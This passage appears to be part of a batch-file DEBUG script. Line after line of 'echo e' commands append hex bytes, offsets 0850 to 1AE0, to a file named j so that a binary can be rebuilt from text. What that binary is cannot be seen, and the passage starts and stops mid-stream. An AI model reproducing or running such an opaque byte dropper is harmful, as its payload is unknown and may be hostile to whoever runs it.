echo e 0850 94 ED 15 65 A3 79 76 82 70 05 6D 16 92 1C 5F 2A>>j
echo e 0860 B1 56 58 51 77 00 C0 1C F4 A8 81 01 B0 2A 79 20>>j
echo e 0870 64 C9 2C 18 FA 53 92 CF CC 40 DC 8C 9A 13 D3 52>>j
echo e 0880 93 D0 BF A6 EA 71 5A DB B2 BA 6F 63 53 45 78 97>>j
echo e 0890 48 EA B1 01 EF 59 4B 6C F1 DC 65 08 DA 00 27 35>>j
echo e 08A0 22 4B 2B B1 03 08 B9 EB EB 4D 59 AB 9A 46 4A F7>>j
echo e 08B0 66 C4 4A 21 40 65 42 10 FE B5 A4 9A DC 56 D1 79>>j
echo e 08C0 5B 31 1A F4 AE 6E FE F2 E5 A0 8D 32 30 31 F9 56>>j
echo e 08D0 45 C5 E5 C1 B8 C8 60 32 38 14 FD A3 8C EE 91 D7>>j
echo e 08E0 17 17 1E 69 23 B8 BE D7 E0 96 C6 58 C2 1C B0 C0>>j
echo e 08F0 FA E6 B9 69 AF 0C 76 A1 59 70 9B AA 08 24 79 DD>>j
echo e 0900 83 38 1B 47 7A 5D 58 98 6C 11 43 2B 73 D4 52 AD>>j
echo e 0910 55 B6 88 AF 38 F2 FB A6 5D E5 DA C9 70 CC A3 07>>j
echo e 0920 DA BA 98 3C 4F 14 5A 7A A6 D2 70 BB 48 FC 6B 8C>>j
echo e 0930 82 3F 36 4C 93 C9 A6 BC AF 16 E5 06 B3 B6 A7 2A>>j
echo e 0940 93 8A 6F B9 D1 6A 5A E4 17 76 E8 02 95 C1 E9 59>>j
echo e 0950 AB A8 47 BB 70 5C 95 E9 CD 63 97 2D 40 CF 6A D0>>j
echo e 0960 CE 35 5A D8 B9 2D C9 79 0B 03 80 69 92 4A 1D 71>>j
echo e 0970 CE 6A B6 71 46 7B 8A 5A 03 AA DE 83 89 18 C5 20>>j
echo e 0980 7C 71 40 E4 D2 30 C1 A6 45 DE E3 FC CC 8A 69 62>>j
echo e 0990 29 99 A5 EB 45 D9 37 1C 08 C7 22 9B 91 DA 93 38>>j
echo e 09A0 A3 A5 21 5C 7E 40 3C D3 4F 5A 4C E7 9A 28 06 EE>>j
echo e 09B0 39 48 CF 34 8E 41 3C 52 51 40 5F 4B 06 29 3A 52>>j
echo e 09C0 D0 D4 C4 D0 DA 29 71 49 41 23 BF 86 9B 4B 9A 4A>>j
echo e 09D0 00 5A B7 23 FE E5 06 2A 04 40 51 8F 71 52 39 1E>>j
echo e 09E0 42 8E F4 8B 8A B6 A3 43 ED 35 A7 A5 30 52 EC 3D>>j
echo e 09F0 2B 1F 93 5A 16 12 F9 41 B2 0F 4A 72 65 C5 B6 5C>>j
echo e 0A00 9A C4 CB 1C 93 17 F5 20 56 33 C6 54 64 F7 AD 15>>j
echo e 0A10 BD 60 59 3A AB 1A 5B C8 57 CB 5D AB C9 F4 A8 E7>>j
echo e 0A20 D6 C6 CE 92 70 6E FB 19 60 61 6A 41 CA 83 48 E9>>j
echo e 0A30 F3 00 06 38 AB 96 F1 AF D9 C9 3D 6A 99 14 A0 E4>>j
echo e 0A40 EC 88 5D 00 4F A8 CD 40 9C 1A 9D B2 4E 31 C5 46>>j
echo e 0A50 8A 4E 71 49 36 D5 87 24 F9 AE 6D 41 71 8B 68 C5>>j
echo e 0A60 49 3B 6F 2B 8A A9 64 EA 61 08 DD 73 57 E5 8C 04>>j
echo e 0A70 5C 75 AE 49 2D 76 3D 9A 15 27 5A 93 8A E8 32 2E>>j
echo e 0A80 48 35 DA E8 77 68 96 70 C7 8F BA 0E 7D F9 AE 2D>>j
echo e 0A90 38 F6 AD 6B 1B B7 B7 DA A1 87 1E B5 AD 09 C5 37>>j
echo e 0AA0 CE 69 2B CA 9A 8A DC D8 F1 26 94 22 D2 6E A4 00>>j
echo e 0AB0 9D C3 23 F2 AF 2B 23 07 15 EC BA DD C3 C9 E1 E9>>j
echo e 0AC0 5D 08 C8 5C D7 91 5C A6 3E 6E E4 F3 5B 45 DF 53>>j
echo e 0AD0 C4 C4 52 6B 56 55 A9 ED D8 24 CA C7 A0 35 0D 3D>>j
echo e 0AE0 3A 8A B4 AE CE 58 E8 EE 7A 57 C3 49 C4 DA FC E1>>j
echo e 0AF0 46 32 9F D0 D7 4F E2 55 22 F3 3D B1 FD 2B CD FC>>j
echo e 0B00 1F 7A F6 3A 93 C9 19 C1 2B FD 0D 74 77 1A B4 F7>>j
echo e 0B10 B2 EF 96 4C F6 C5 29 C9 C1 A6 B7 3B 69 EB 2B B3>>j
echo e 0B20 8F BB 91 FF 00 B4 67 2B C2 EE 3F A5 32 E9 23 B8>>j
echo e 0B30 89 1D 57 07 B9 F5 AD AB EB 78 3E CF 2B 80 03 93>>j
echo e 0B40 C9 FC 6B 36 D1 22 69 52 13 CF 7A 2A 54 76 B8 3B>>j
echo e 0B50 18 37 30 88 64 DA 0E 6A 30 4F 4A D3 D6 A2 55 BE>>j
echo e 0B60 DA 8B 85 0A 2B 30 0F 9C 0A 95 B1 CB 35 69 68 29>>j
echo e 0B70 4C 53 83 9C 60 0A 98 45 C1 24 51 84 C8 01 7E B4>>j
echo e 0B80 36 8B 54 DE E8 85 BE 65 A8 88 C7 5A B6 54 04 27>>j
echo e 0B90 15 03 0F 51 D6 9A 64 D4 85 88 A8 A7 30 03 A5 36>>j
echo e 0BA0 99 88 EC 64 E0 55 88 50 80 72 38 A8 10 E1 C5 68>>j
echo e 0BB0 41 B4 A9 CD 17 77 3A 28 41 49 DD 94 E4 8C 7F 09>>j
echo e 0BC0 A8 48 E6 AF 94 52 B8 1D 6A BB A6 E6 C6 39 A8 52>>j
echo e 0BD0 26 70 D7 42 BD 14 E6 5D A7 14 DA B3 26 AC 6D 6D>>j
echo e 0BE0 01 C1 3D AA CC 71 17 25 98 E3 D2 AA C6 EA ED DC>>j
echo e 0BF0 D5 D4 7F 93 04 63 6D 45 9D FC 8D E3 76 20 42 5B>>j
echo e 0C00 0B 9C 7A D6 8D A4 11 46 09 7E A7 DA A8 DB CE 37>>j
echo e 0C10 8C 9E 2B 49 67 43 2E 55 72 00 CD 54 9D CA 96 8A>>j
echo e 0C20 C3 DE D8 81 B8 8C 03 C8 AC D9 A0 69 5C 0D BF 2A>>j
echo e 0C30 9E 71 57 A6 BB 33 3A 8E 76 8A B2 A4 3D BB 45 1A>>j
echo e 0C40 81 91 9D D5 11 8A 4B 42 15 D9 93 16 D8 77 2F 03>>j
echo e 0C50 03 8A 7C 0E D2 CA 11 CE 03 11 57 20 D2 5D 8E F7>>j
echo e 0C60 19 CF 43 5A 16 7A 64 62 E0 97 04 85 19 AA 50 68>>j
echo e 0C70 D1 D3 BB 2F 5A 68 B6 7E 48 F3 73 21 61 93 F4 A8>>j
echo e 0C80 75 5B 44 DB 10 B6 5D A8 BC 62 B4 13 51 B5 8B 4F>>j
echo e 0C90 60 47 CE AF B4 F3 CE 2A 9D CE A5 04 BE 5A C5 CF>>j
echo e 0CA0 3C 9C 53 E5 6F 42 FE 1D 12 39 3B C9 0A DD B2 BB>>j
echo e 0CB0 10 07 1F AD 40 6E 32 F9 DD 80 2A F6 A5 B6 6B E7>>j
echo e 0CC0 6C 60 0A C3 B8 6E 4E 2A A5 4D C6 3A 6E 54 53 F8>>j
echo e 0CD0 99 AA 25 8A 40 BE 64 B8 E6 A8 6A 0C 82 7F 91 F3>>j
echo e 0CE0 8E 86 A8 89 0F F1 13 4C 90 EE 62 45 4C 1F 2A D4>>j
echo e 0CF0 A9 D5 6D 59 12 FD A1 A3 CB 2B F3 50 49 77 2C F8>>j
echo e 0D00 57 62 40 A8 5B 9A 07 14 5A FA 9C 52 93 6C B0 A4>>j
echo e 0D10 76 35 0B 64 F7 A7 AB 01 48 69 1A 4B 54 31 57 D3>>j
echo e 0D20 AD 28 E2 9C BC 1A 76 D2 79 A1 8A 30 EC 34 A8 22>>j
echo e 0D30 99 B7 15 65 61 73 DA 94 DB 9C 75 14 D2 B9 4E 9D>>j
echo e 0D40 F6 2B 66 93 EB 52 32 6D 38 A4 23 23 A5 1D 4C F9>>j
echo e 0D50 5F 52 36 14 DC D3 C8 A6 11 4D 99 B4 C5 A4 A5 19>>j
echo e 0D60 34 B8 A4 16 12 92 9C 45 26 28 1B 41 45 25 38 73>>j
echo e 0D70 40 90 94 95 26 28 C5 03 E5 63 4F CC 69 0A 91 52>>j
echo e 0D80 2F 07 34 AD F3 73 4D 0F 97 42 0A 51 52 10 31 4C>>j
echo e 0D90 2B 41 2E 36 27 86 50 90 BA 91 D7 14 D7 86 51 8C>>j
echo e 0DA0 83 83 D2 A2 19 E9 5A 6F 2F 9A F1 A0 18 03 02 8B>>j
echo e 0DB0 76 34 82 72 D0 AF 05 BC 81 F2 17 35 AD 61 6D 24>>j
echo e 0DC0 AB 27 C8 33 8C 66 AB 3B B4 52 71 D0 0A D1 D3 E5>>j
echo e 0DD0 7F B2 B3 A9 18 27 91 49 27 B9 DB 4A 94 6F 63 3D>>j
echo e 0DE0 B4 DB A5 2E C2 22 70 7B 0E B4 E8 AD E6 86 68 E4>>j
echo e 0DF0 90 E5 2B 60 DE FC BB 77 63 8A A1 3B 16 DA 9B B8>>j
echo e 0E00 2D 57 1A 7A A6 C2 A5 3B 34 B6 46 66 A4 3C CB C2>>j
echo e 0E10 50 60 62 92 07 DB 0E 08 EA 6A CD FD A9 82 74 05>>j
echo e 0E20 B2 4A 03 54 C1 DA 0A FB D4 49 7B DA 6C 67 4D 72>>j
echo e 0E30 4A E4 B2 00 57 22 A0 8E 45 47 21 AA 6C EE 18 AA>>j
echo e 0E40 93 26 39 A1 B4 F4 1D 6B A5 CC 89 21 97 6D CA 91>>j
echo e 0E50 D3 35 BD BF 2C BE 98 AC 0B 48 19 E5 4C 7A D7 48>>j
echo e 0E60 D1 10 14 91 8E 2B 29 C6 32 D2 FA 9D B9 64 27 38>>j
echo e 0E70 C8 81 C8 EA 3D 68 0C CD 2E 14 93 4F 30 D3 23 95>>j
echo e 0E80 22 90 E4 73 8A C3 D9 BB D8 EC 9D 09 46 D2 93 36>>j
echo e 0E90 66 BF 66 B3 68 8B E4 91 82 2B 98 D5 D5 15 13 03>>j
echo e 0EA0 04 F5 AB 90 DC 2C B3 AC 5D 4B 1C 66 99 E2 1B 4F>>j
echo e 0EB0 B3 AC 44 7D D2 2B A2 11 92 56 67 9F 89 E5 70 6D>>j
echo e 0EC0 1C ED 2F 4E 45 25 28 F4 AD 4F 18 BD A6 CD 24 73>>j
echo e 0ED0 97 43 82 14 E6 AD 45 77 70 C5 B0 72 07 35 4A D0>>j
echo e 0EE0 EC 72 7D 8D 5E 8A 2F F4 7F 31 7A 92 41 AB 57 B5>>j
echo e 0EF0 CE CA 71 6E 25 A5 91 EE 63 11 29 E5 86 79 A9 D2>>j
echo e 0F00 CE 5B 7B 57 72 46 F6 C0 06 A2 D2 20 DD A9 A4 45>>j
echo e 0F10 B3 B8 56 E6 BB A7 4B 67 64 AC A7 E5 0D C5 73 D4>>j
echo e 0F20 BB 68 23 AC B5 39 0B B7 75 B8 3E 6F 2D D2 B3 98>>j
echo e 0F30 FC E4 8A BF 76 F9 9F 24 72 47 35 42 41 87 35 A5>>j
echo e 0F40 B5 33 AF B9 24 32 36 EC 67 35 2A B6 D0 4F A9 AA>>j
echo e 0F50 D1 9C 37 15 32 2E F1 92 7A 52 68 29 C9 DA C4 C1>>j
echo e 0F60 59 D7 20 75 A6 CC 1D A3 E5 7A 54 F1 70 00 15 33>>j
echo e 0F70 21 90 62 88 C5 B7 73 B7 D8 A9 C7 CC C9 08 4A 93>>j
echo e 0F80 8E 29 87 AD 5D 9E 23 11 DB D8 D5 47 1F 35 57 53>>j
echo e 0F90 CF A9 4D C3 46 36 AD 5B 90 14 E4 F3 DA AB AA 82>>j
echo e 0FA0 46 6A 65 1B 39 EA 29 30 A6 9D EE 4B B7 F7 7C 1E>>j
echo e 0FB0 69 03 6D EA 33 40 F9 95 32 08 C9 EB 53 C8 A1 1C>>j
echo e 0FC0 6E 43 B3 E9 50 91 D1 18 DC A7 70 17 82 3B D5 7A>>j
echo e 0FD0 B9 78 A8 1C 04 FB A4 7E 55 54 AE 0E 33 56 B4 39>>j
echo e 0FE0 AA 2F 78 BB 6C 49 93 23 38 F5 AD 65 2A 49 07 9C>>j
echo e 0FF0 D6 7D 94 6C C3 6E 30 09 E4 D6 9C 3B 64 8F 66 30>>j
echo e 1000 14 64 B7 AD 53 D5 5C E9 51 51 85 C6 47 81 21 0A>>j
echo e 1010 BD 3A 1A 95 5C AE EE 7A F6 A9 92 D6 7B C9 D5 2D>>j
echo e 1020 E3 0A 02 F1 93 53 2E 89 76 59 B7 01 81 CE 73 50>>j
echo e 1030 F4 31 5A EE 53 92 6C AE D5 5C 1F 5A B3 A6 CE 5B>>j
echo e 1040 87 6C 05 A7 49 A5 CF 1C C0 15 24 70 38 A9 3E C3>>j
echo e 1050 2C 10 EF 31 FC 87 BD 28 C9 36 74 D1 A6 9B 45 89>>j
echo e 1060 75 77 5C 08 87 CA A0 8E 9D EA AC 9A FC FC 84 C0>>j
echo e 1070 E3 06 92 22 85 F1 81 EF 54 2E 2D DA 3B A6 F9 7E>>j
echo e 1080 53 CD 6F 26 AD 73 6C 4D 1E 5B 72 F5 2E 0B 87 91>>j
echo e 1090 72 4F 0F D4 FA 9A 96 19 BC 96 C7 1C FA D4 17 45>>j
echo e 10A0 23 D2 32 83 04 11 58 86 ED CF 20 9C 9A CB 99 B7>>j
echo e 10B0 74 44 AA 72 AB 35 A9 76 FE 59 5E E9 C9 61 CF 4C>>j
echo e 10C0 7A 55 27 43 E5 E4 9C FD 29 E9 22 C8 32 ED D0 62>>j
echo e 10D0 A1 0E 43 63 3F 2E 6A DC DF 72 5C 95 AE 22 C6 1B>>j
echo e 10E0 82 2A 07 8F E6 20 1E F5 72 59 15 42 ED 1D 3A D5>>j
echo e 10F0 67 70 D9 C0 EF 59 59 98 37 72 35 8B 73 ED A7 BD>>j
echo e 1100 BE C1 D7 34 1E 30 47 5A 9C E5 A2 C5 1C C4 E8 52>>j
echo e 1110 D8 C4 E0 0A 50 A7 D2 AD C5 11 27 24 E2 AC 18 42>>j
echo e 1120 AF 02 8B A2 A3 1B 95 21 83 71 E6 A6 31 EC E3 1C>>j
echo e 1130 53 97 11 3E 0F 7A 9B 03 9C D3 6F A1 AC 6C B7 20>>j
echo e 1140 4C F2 3D 68 20 81 ED 40 3C 9A 1B A6 43 51 06 ED>>j
echo e 1150 66 56 97 D0 AD 28 0C DC 54 67 18 A7 BE 49 A6 62>>j
echo e 1160 9B 6C 89 22 26 34 95 29 8F 34 C2 84 1A 57 30 94>>j
echo e 1170 5A D4 60 EB 4E C5 2A 63 3C D2 9C 51 71 24 AC 26>>j
echo e 1180 33 49 8E D4 F5 E9 40 53 9E 94 CA E5 44 7B 0D 39>>j
echo e 1190 57 15 36 01 1D 29 BD 0D 2B 95 EC D2 13 18 14 D3>>j
echo e 11A0 4F EB 43 29 02 AA E3 71 EC 46 79 A6 93 4A 69 29>>j
echo e 11B0 19 31 7B 52 A0 04 F3 48 71 8A 01 C5 20 D2 E3 F6>>j
echo e 11C0 80 6A 75 18 75 6C FA 55 6C D4 91 BF CE A0 FA D3>>j
echo e 11D0 4D 75 34 8B 57 3A EF 08 69 90 6B 3A 94 90 5C 72>>j
echo e 11E0 8A 37 7F F5 AB AB BA D1 34 FB 46 09 1A 60 67 A5>>j
echo e 11F0 73 5E 06 90 C1 AA CC 53 91 B3 FA 1A E8 AF AE CB>>j
echo e 1200 31 63 9C E7 BD 5B 67 45 25 27 3B 90 C9 A2 59 98>>j
echo e 1210 CC 8F 11 27 04 E4 0A C8 D6 6C ED E2 D3 61 78 21>>j
echo e 1220 63 26 E1 8C 0A F4 8B 49 F4 F6 D2 61 32 EC F3 0A>>j
echo e 1230 E3 1C 1C 9C 55 5B 9B 1B 79 60 55 58 54 FC DC 71>>j
echo e 1240 44 5B B5 98 EA D4 52 D2 DB 1E 49 AE 21 0D 04 9B>>j
echo e 1250 19 73 18 CE 46 39 AC 42 E3 77 E3 5E B5 E2 7D 22>>j
echo e 1260 39 44 48 91 01 95 F4 FA D7 94 6A 56 E6 DE FA 68>>j
echo e 1270 C0 C0 57 22 93 D4 C1 B7 18 DC 15 CF 6A 8E 42 18>>j
echo e 1280 D1 13 E5 48 3E 94 D2 0F 35 9F 5D 41 CE F1 2D 40>>j
echo e 1290 FB 24 42 38 35 D3 10 AD 6C A4 9E 71 91 5C 74 6E>>j
echo e 12A0 C2 55 15 B4 93 48 5D 55 89 C5 65 51 6A 8F 4F 2D>>j
echo e 12B0 C4 A8 DE 36 2E 02 4F 15 4E 74 3E 69 22 AE 29 DA>>j
echo e 12C0 1B 3E 95 11 2B C9 27 B5 69 0B 3B BE A7 A7 88 5C>>j
echo e 12D0 D1 D4 CB 89 8A CE 5C 70 41 CD 4D AC DE BD DA C6>>j
echo e 12E0 0F DD 51 81 55 97 3E 6B 7A 13 49 78 0F 96 0D 3B>>j
echo e 12F0 B6 CF 02 6B F7 6C A1 40 34 7A D0 3A D6 87 98 4F>>j
echo e 1300 0B 1C E3 DA B7 6C 63 69 74 FF 00 94 12 41 EC 3D>>j
echo e 1310 EB 0E DC 80 F9 3D 31 5D B7 87 7C 91 A6 2E 40 F9>>j
echo e 1320 9C E4 9F 63 43 6E DA 1D 94 6F 6D 07 D8 D8 C7 0C>>j
echo e 1330 91 4A 10 A4 A4 64 E6 B4 6F 6E 1E 6B 62 93 2F CA>>j
echo e 1340 5B 8C 8A D2 90 42 55 58 01 D3 8A A7 A9 C6 67 B3>>j
echo e 1350 11 C6 3E 60 73 9A CD C9 6C C7 AC 74 91 E7 FA E0>>j
echo e 1360 58 EF FE 41 81 B4 56 43 9C 9C D6 D7 88 2D E6 86>>j
echo e 1370 ED 0C 83 19 51 58 E1 7E 53 54 B6 B9 CF 2B B6 22>>j
echo e 1380 9C 03 52 AB 0D 83 EB 50 54 88 0D 0F 61 41 EA 68>>j
echo e 1390 47 8C 2D 5B 98 85 19 5F 5A A1 19 C6 DA B2 CF 95>>j
echo e 13A0 E6 94 1B 5A 1E BD 37 EE 8C 72 24 1C 8C D5 09 97>>j
echo e 13B0 12 1C 0A D3 88 AE DE 6A 85 C4 6C CE 48 AA 6E E6>>j
echo e 13C0 18 9A 77 8A 91 5B 76 1B 35 2E E0 C8 06 79 A8 48>>j
echo e 13D0 C1 E6 9E A0 91 91 49 9E 7C 1B 5A 17 12 36 78 C7>>j
echo e 13E0 3C 0A 98 97 76 01 BA 7A 54 30 B3 04 1E 95 A3 28>>j
echo e 13F0 51 12 92 3E 6E 30 6B 29 4B 5B 24 7A 54 79 19 9B>>j
echo e 1400 74 AA 3A 8E 4D 51 AD 39 97 CC E4 F5 AA 86 0E 78>>j
echo e 1410 AB 4C E7 C4 51 6E 5A 16 E2 66 4B 66 6D F8 E7 A5>>j
echo e 1420 4C 8F 2F 90 AF BB 6C 64 7A D5 68 14 DC 13 90 4C>>j
echo e 1430 6B D8 57 4D A7 5A 5B 8B 38 9A 58 F2 7B A9 1E F4>>j
echo e 1440 F9 AD A1 10 BD 47 62 DE 89 1D D9 26 57 1B 54 8D>>j
echo e 1450 A0 11 83 5B AD 19 65 18 6C 13 D4 D6 75 8D C9 96>>j
echo e 1460 E9 53 1C 28 E7 02 B4 2E 37 47 CC 6A C7 D7 8A CE>>j
echo e 1470 73 56 B2 3B 21 0A 6B 46 42 99 59 BF BD C7 15 1D>>j
echo e 1480 EB 35 D4 7F 66 40 14 67 24 D3 0C C7 CD C0 04 7A>>j
echo e 1490 F1 4C B9 95 63 88 32 1E 73 8A D2 9D 26 95 D8 7B>>j
echo e 14A0 37 07 E4 CC F9 EC 56 C5 50 BB 8C 93 EB 54 5E 54>>j
echo e 14B0 7B 82 73 9C 0A D0 BD 5F B4 AC 5B C1 38 EF 58 57>>j
echo e 14C0 6A 60 BC 64 4C E0 E3 AD 54 E8 54 DE E4 4A 52 E6>>j
echo e 14D0 4A FA 21 D7 77 08 F6 92 47 EF 58 BD 18 56 93 46>>j
echo e 14E0 0A 39 6E F5 48 46 BE 67 3D AA 61 07 6D 48 AD 79>>j
echo e 14F0 49 32 3C 7C DC 1E B5 3A A8 11 E5 AA 45 86 32 58>>j
echo e 1500 9E B8 C8 AA E2 46 39 4E C0 D4 B6 73 73 24 EC C7>>j
echo e 1510 18 CE D2 41 34 91 22 BA 90 47 35 65 90 AC 63 3D>>j
echo e 1520 E8 58 D7 CB F9 71 EF 4B 9E FB 9A 34 AC 57 2A 14>>j
echo e 1530 ED C5 4C A8 71 C9 A0 2E DE BC E6 9E 38 FB DD 29>>j
echo e 1540 25 CD B1 93 B3 7A 03 29 55 C9 E4 0A 9D 5C BA 8C>>j
echo e 1550 8C 53 00 1B 08 FE 13 51 3C C5 5B 60 AB 74 E4 F4>>j
echo e 1560 46 BA AD 84 91 03 4B 9C F0 3A 52 07 63 2E DC 71>>j
echo e 1570 44 81 86 31 52 05 23 07 B9 A5 C8 D6 E0 AF D4 6C>>j
echo e 1580 A7 03 00 73 55 A4 70 06 CE F5 2B EF 2C 71 D6 A0>>j
echo e 1590 55 06 53 BC D3 94 6D AB 07 24 B5 1A 39 34 7B D3>>j
echo e 15A0 FC A6 67 F9 47 15 32 DB C7 B7 27 AF A5 28 BB 07>>j
echo e 15B0 B4 4C 80 8C 60 8A 70 B7 79 46 40 E9 57 15 53 CB>>j
echo e 15C0 38 FB C2 A4 B6 23 27 23 14 9C BA 22 9B E6 D0 A8>>j
echo e 15D0 34 B9 71 91 CF 19 A6 1B 19 36 E4 01 5A 52 CA CA>>j
echo e 15E0 DD 78 AA E6 56 E4 76 35 AC 60 ED 73 3F 65 25 D0>>j
echo e 15F0 AE 2C 18 73 9F A5 32 4B 77 8F 3C F1 5A 11 C9 E6>>j
echo e 1600 01 DB 6D 3D A3 59 32 49 1F 4A 6A 85 4D CD A3 42>>j
echo e 1610 52 D8 C4 04 F4 A3 1E B5 A4 D0 45 82 71 50 47 02>>j
echo e 1620 17 39 CF 5A 95 16 D0 AA 53 E4 DC A8 AB CF 5C 54>>j
echo e 1630 8E 0E DE B5 61 ED E3 C9 39 A6 34 48 53 39 AC F7>>j
echo e 1640 66 31 A8 92 B1 50 8E 68 F2 F2 32 2A 47 4E E2 90>>j
echo e 1650 2B 11 8A AE 61 D9 31 85 46 29 AA 99 35 A0 6D 11>>j
echo e 1660 14 67 3D 2A 32 98 63 B4 71 4A 32 BE C2 94 4A E2>>j
echo e 1670 13 52 2C 3F 30 35 20 19 52 6A E8 85 3C C8 93 FB>>j
echo e 1680 C4 66 B4 51 6F 42 5C 5E 88 D6 F0 7C EB 6F A9 4A>>j
echo e 1690 5B 91 B0 FF 00 23 5B 97 21 EE D5 A4 8F EE 86 E6>>j
echo e 16A0 B1 AC 20 5B 79 26 28 A7 38 C7 4A ED FC 1B A6 47>>j
echo e 16B0 79 A6 4E D2 83 B8 37 46 1E F5 75 28 CE 16 B9 DC>>j
echo e 16C0 93 A5 0B B3 16 D6 59 12 78 D0 B1 21 08 3D 6B AE>>j
echo e 16D0 B7 BB 50 14 16 EA 73 56 6E 3C 3D 6B 1D B4 B2 85>>j
echo e 16E0 01 F1 9E 95 C7 EA 57 B2 59 43 1B 00 41 DC 05 65>>j
echo e 16F0 51 F2 AB B2 1C A2 F5 7A 1D 4E A6 56 76 84 28 EA>>j
echo e 1700 3D 2B CA FC 4D 69 1C 7A C4 EA AB EB 9F AE 4D 6F>>j
echo e 1710 EA 7E 27 B9 8D 62 45 20 72 48 3E C7 A5 72 57 97>>j
echo e 1720 F2 5C 4E CF 21 DC C7 B9 AC F9 F5 D0 A8 54 84 A3>>j
echo e 1730 63 19 54 2C 84 D4 C9 17 98 BB 81 EF 8A 6B 26 F7>>j
echo e 1740 62 3B D4 D6 BF 23 10 DC 7A 53 94 B4 D0 E7 A7 A4>>j
echo e 1750 AC F6 2A F9 4C 97 2B 91 DE B7 1A 22 24 18 ED 54>>j
echo e 1760 25 00 B0 6E F9 AB 50 CE EF 36 3A E4 51 CA E5 66>>j
echo e 1770 75 E1 39 69 D4 77 EA 59 C9 27 07 A5 54 94 9F 3F>>j
echo e 1780 68 E9 5A 50 C7 E6 B1 CF F2 A9 5A C6 0F BE DD 7D>>j
echo e 1790 6B 48 60 AA FC 47 AB 56 15 2A 6A 9E 87 3D 27 07>>j
echo e 17A0 00 74 A9 24 8C DC 42 91 8C 64 D5 9B 98 15 54 B0>>j
echo e 17B0 EA 69 D6 EA 82 DC 39 FB C0 D1 0A 6F 53 82 A5 26>>j
echo e 17C0 9B 8B EA 60 4F 11 86 56 43 D4 54 75 6F 51 C1 BB>>j
echo e 17D0 63 EB 8A A9 54 D5 8F 12 71 E5 93 43 D0 E2 BB CF>>j
echo e 17E0 0F 58 9B 9F 0F 47 28 6C 1D ED FC EB 83 41 9A F5>>j
echo e 17F0 4F 05 C6 A7 C2 D1 82 3F 8D BF 9D 2E 64 91 D3 87>>j
echo e 1800 9F 2C AE 59 96 D5 E2 B3 57 6F BA A0 67 9A 8E C2>>j
echo e 1810 54 BE 98 C2 87 9F 5A DD D7 60 11 78 75 E4 41 92>>j
echo e 1820 10 1A F3 9F 0C EA AE BA AB 02 70 32 7A D6 2D 39>>j
echo e 1830 3D 0B AB 53 9D 8D F1 C5 AC 91 6A A8 09 F9 4C 62>>j
echo e 1840 B9 42 42 A9 07 AD 76 DE 28 97 ED 1A 9C 6C F8 60>>j
echo e 1850 13 1E B5 C9 5F 2C 7B C9 51 8F 6A DF 91 A4 29 52>>j
echo e 1860 6A 1C E8 A1 DE A4 46 2B 4D 55 CE 4F A5 3C 1C 8C>>j
echo e 1870 62 A5 9C D0 45 DB 6F DE F5 E3 15 24 D9 54 DA 3D>>j
echo e 1880 6A 8C 53 18 CE 05 5D 8C B4 A7 2D 59 4D 5B 53 BE>>j
echo e 1890 15 61 C9 67 B9 1A 96 24 03 4B 23 80 39 ED 5A FA>>j
echo e 18A0 7D A4 13 A3 6F C6 E0 78 AC CD 4A 01 1D C3 85 FB>>j
echo e 18B0 A2 A6 15 53 95 8A 73 BC 1D 8C B6 39 34 F8 D3 72>>j
echo e 18C0 13 9A 8D B8 35 2C 24 E3 1E B5 BB D8 F3 A3 AC B5>>j
echo e 18D0 2D 44 70 80 1A B0 67 32 AE DE E3 18 AA FB 4B 28>>j
echo e 18E0 00 F3 4F 8A 19 12 60 0F 5A 85 06 DF 31 DB 08 C9>>j
echo e 18F0 49 58 47 72 AD 83 D6 AB 96 39 E0 D6 94 D6 C6 44>>j
echo e 1900 77 23 05 71 DA A8 8B 39 1C 65 79 1F 5A D3 D9 49>>j
echo e 1910 6A 15 F9 D4 8E BF 49 D3 A3 B5 8D 96 48 D4 B7 5C>>j
echo e 1920 60 13 52 CC 0C 73 30 00 ED 1D 6A 3D 32 F9 5D F7>>j
echo e 1930 B9 E4 9C D7 40 34 77 9A 22 51 C0 F3 7A E7 B5 5D>>j
echo e 1940 38 C6 74 DB EA 6B 75 4E D7 28 F8 4A 78 A7 D7 1D>>j
echo e 1950 64 40 54 A7 A7 D2 BB 6B 86 B6 0C 02 C6 9C F5 F9>>j
echo e 1960 45 71 76 1A 54 BA 0E A3 F6 87 70 50 8D B5 BB 6B>>j
echo e 1970 76 97 72 6E 04 10 BD 6B 9A 9F 2A 7C AC E4 A9 34>>j
echo e 1980 E5 74 C8 EE 74 D1 24 D3 61 06 31 91 81 5C 96 25>>j
echo e 1990 13 3C 64 64 2B 1E B5 E9 5B 10 59 BC A0 82 E0 71>>j
echo e 19A0 5C 24 96 CE F3 BE C6 E4 B1 CD 74 C6 DD 5E 87 45>>j
echo e 19B0 0A 97 BD C7 42 E9 98 C4 AA 00 24 01 C5 62 6A 56>>j
echo e 19C0 52 3E A0 CE 83 8E D5 B9 77 64 E1 61 C9 DB 8E 73>>j
echo e 19D0 59 F3 4A D0 DC 32 97 DD F2 FA D6 CE 4E 30 D3 60>>j
echo e 19E0 9C 9D EE B6 31 A4 21 61 74 D8 0B E6 A9 35 B4 92>>j
echo e 19F0 2A 9D 98 27 9A BA 12 43 24 8D D7 92 73 57 E0 B5>>j
echo e 1A00 92 7D A4 B0 27 1C 0A C6 33 77 B3 13 86 CD 98 02>>j
echo e 1A10 09 91 C8 C1 A1 6D 82 7C CF 9C E6 B4 66 F3 21 B9>>j
echo e 1A20 75 60 01 53 8F D6 AA BB 17 62 07 4A C5 C5 5E C7>>j
echo e 1A30 33 93 E8 88 E4 E8 02 9C D3 13 28 7E B5 28 5D A7>>j
echo e 1A40 8E D4 DD D8 62 31 53 55 25 B0 29 29 2B B1 54 0C>>j
echo e 1A50 9E 69 A4 86 EB CE 29 40 2E 0E 0D 4A 96 A5 94 90>>j
echo e 1A60 DF 5A A8 A8 BD 9E A5 C7 DE 20 2E 4A 71 EB 51 AC>>j
echo e 1A70 7F 3E 4D 5B FB 1B 08 4B 03 DE 98 2D DC 30 39 AA>>j
echo e 1A80 8E F6 B8 34 C7 28 2B DB 35 2C 68 E4 12 CB F2 D4>>j
echo e 1A90 B0 3A B4 DB 4F A5 59 36 B2 CB 1E 62 20 7B 55 37>>j
echo e 1AA0 67 A0 28 DD 5D 99 ED 0F 1C 0E 4D 11 5A 2A 1C C8>>j
echo e 1AB0 83 35 A4 6C 25 8D D5 01 04 9A B5 36 8F 70 20 2E>>j
echo e 1AC0 D8 C5 12 5C CA EC D2 31 8A DC CB 8E 20 65 62 AB>>j
echo e 1AD0 ED 43 DA 6E 6C 01 83 9A B7 69 61 72 D9 65 3C 03>>j
echo e 1AE0 83 5A 7F D8 D3 AC 81 CB 02 BC 1A 50 51 69 DC CE>>j
